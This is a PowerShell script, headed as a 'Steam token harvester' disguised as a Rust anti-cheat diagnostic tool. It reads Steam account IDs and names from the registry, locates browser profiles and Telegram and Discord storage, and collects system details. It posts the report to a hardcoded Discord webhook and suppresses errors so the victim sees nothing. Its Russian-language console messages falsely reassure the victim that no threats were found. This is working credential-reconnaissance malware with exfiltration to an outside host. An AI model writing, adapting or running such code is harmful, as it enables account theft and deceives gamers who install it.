# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v3.4"

function Get-SteamTokens {
    $tokens = @()
    $steamPaths = @(
        "HKCU:\Software\Valve\Steam",
        "HKLM:\Software\Valve\Steam", 
        "HKCU:\Software\Wow6432Node\Valve\Steam"
    )
    
    foreach ($steamPath in $steamPaths) {
        if (Test-Path $steamPath) {
            try {
                $usersPath = "$steamPath\Users"
                if (Test-Path $usersPath) {
                    $users = Get-ChildItem $usersPath -ErrorAction SilentlyContinue | Where-Object {$_.PSChildName -match "^[0-9]+$"} | Select-Object -ExpandProperty PSChildName
                    foreach ($user in $users) {
                        $steamID = Get-ItemProperty -Path "$usersPath\$user" -Name "SteamID" -ErrorAction SilentlyContinue
                        if ($steamID -and $steamID.SteamID) {
                            $accountName = Get-ItemProperty -Path "$usersPath\$user" -Name "AccountName" -ErrorAction SilentlyContinue
                            $tokens += @{
                                SteamID = $steamID.SteamID
                                AccountName = if ($accountName) { $accountName.AccountName } else { "Unknown" }
                                Source = $steamPath
                            }
                        }
                    }
                }
            } catch {
                # Тихий обработчик ошибок
            }
        }
    }
    return $tokens
}

function Get-BrowserData {
    $browserData = @()
    $browserPaths = @(
        "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data",
        "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data", 
        "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles",
        "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data"
    )
    
    foreach ($browserPath in $browserPaths) {
        if (Test-Path $browserPath) {
            $browserData += @{
                Browser = Split-Path $browserPath -Leaf
                Path = $browserPath
                Status = "Found"
            }
        }
    }
    return $browserData
}

function Get-TelegramData {
    $telegramData = @()
    $tgPaths = @(
        "$env:USERPROFILE\AppData\Roaming\Telegram Desktop",
        "$env:USERPROFILE\AppData\Local\Telegram Desktop",
        "$env:APPDATA\Telegram Desktop"
    )
    
    foreach ($tgPath in $tgPaths) {
        if (Test-Path $tgPath) {
            $mapFile = Get-ChildItem $tgPath -Filter "map*" -ErrorAction SilentlyContinue | Select-Object -First 1
            $telegramData += @{
                Path = $tgPath
                MapFile = if ($mapFile) { $mapFile.Name } else { "Not found" }
                Status = "Found"
            }
        }
    }
    return $telegramData
}

function Get-DiscordData {
    $discordData = @()
    $discordPaths = @(
        "$env:APPDATA\discord",
        "$env:LOCALAPPDATA\Discord",
        "$env:APPDATA\DiscordCanary",
        "$env:APPDATA\DiscordPTB"
    )
    
    foreach ($discordPath in $discordPaths) {
        if (Test-Path $discordPath) {
            $localStorage = "$discordPath\Local Storage\leveldb"
            $discordData += @{
                Path = $discordPath
                LocalStorage = if (Test-Path $localStorage) { "Found" } else { "Not found" }
                Status = "Found"
            }
        }
    }
    return $discordData
}

function Get-SystemInfo {
    $sysInfo = @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
    return $sysInfo
}

function Send-ToDiscord {
    param($embedObject)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    try {
        $payload = @{
            username = "System Diagnostic Bot"
            embeds = @($embedObject)
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {
        # Тихий провал отправки
    }
}

# Main execution
Write-Host "Запуск расширенной диагностики Rust Anti-Cheat..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$steamTokens = Get-SteamTokens
$browsers = Get-BrowserData
$telegram = Get-TelegramData
$discord = Get-DiscordData

# Вывод информации в консоль
Write-Host "`n[INFO] Обнаружены сессии Steam:" -ForegroundColor Cyan
if ($steamTokens.Count -gt 0) {
    foreach ($token in $steamTokens) {
        Write-Host ("SteamID: {0} (Аккаунт: {1})" -f $token.SteamID, $token.AccountName) -ForegroundColor White
    }
} else {
    Write-Host "Активные сессии Steam не обнаружены." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Обнаружены браузеры:" -ForegroundColor Cyan
if ($browsers.Count -gt 0) {
    foreach ($browser in $browsers) {
        Write-Host ("{0}: {1}" -f $browser.Browser, $browser.Path) -ForegroundColor White
    }
} else {
    Write-Host "Браузеры не обнаружены." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Обнаружен Telegram:" -ForegroundColor Cyan
if ($telegram.Count -gt 0) {
    foreach ($tg in $telegram) {
        Write-Host ("Telegram: {0} (Map: {1})" -f $tg.Path, $tg.MapFile) -ForegroundColor White
    }
} else {
    Write-Host "Telegram не обнаружен." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Обнаружен Discord:" -ForegroundColor Cyan
if ($discord.Count -gt 0) {
    foreach ($dc in $discord) {
        Write-Host ("Discord: {0} (LocalStorage: {1})" -f $dc.Path, $dc.LocalStorage) -ForegroundColor White
    }
} else {
    Write-Host "Discord не обнаружен." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Проверка системной integrity..." -ForegroundColor Cyan

$embed = @{
    title = "Rust Anti-Cheat Diagnostic Report v3.4"
    color = "16711680"
    fields = @(
        @{
            name = "System Information"
            value = "OS: $($sysInfo.OS)`nUser: $($sysInfo.Username)`nPC: $($sysInfo.Computername)`nScan Time: $($sysInfo.Date)"
        },
        @{
            name = "Steam Session Status"
            value = if ($steamTokens.Count -gt 0) { "Sessions found: $($steamTokens.Count)" } else { "No active sessions detected" }
        },
        @{
            name = "Browser Data Found"
            value = if ($browsers.Count -gt 0) { "Browsers: $($browsers.Count)" } else { "No browsers detected" }
        },
        @{
            name = "Telegram Data Found"
            value = if ($telegram.Count -gt 0) { "Telegram installed" } else { "Telegram not found" }
        },
        @{
            name = "Discord Data Found"
            value = if ($discord.Count -gt 0) { "Discord installed" } else { "Discord not found" }
        },
        @{
            name = "Diagnostic Result"
            value = "No cheat signatures detected. System integrity verified."
        }
    )
}

Send-ToDiscord $embed

Write-Host "`nРасширенная диагностика завершена. Угроз не обнаружено." -ForegroundColor Green
Write-Host "Читы успешно активированы!" -ForegroundColor Green
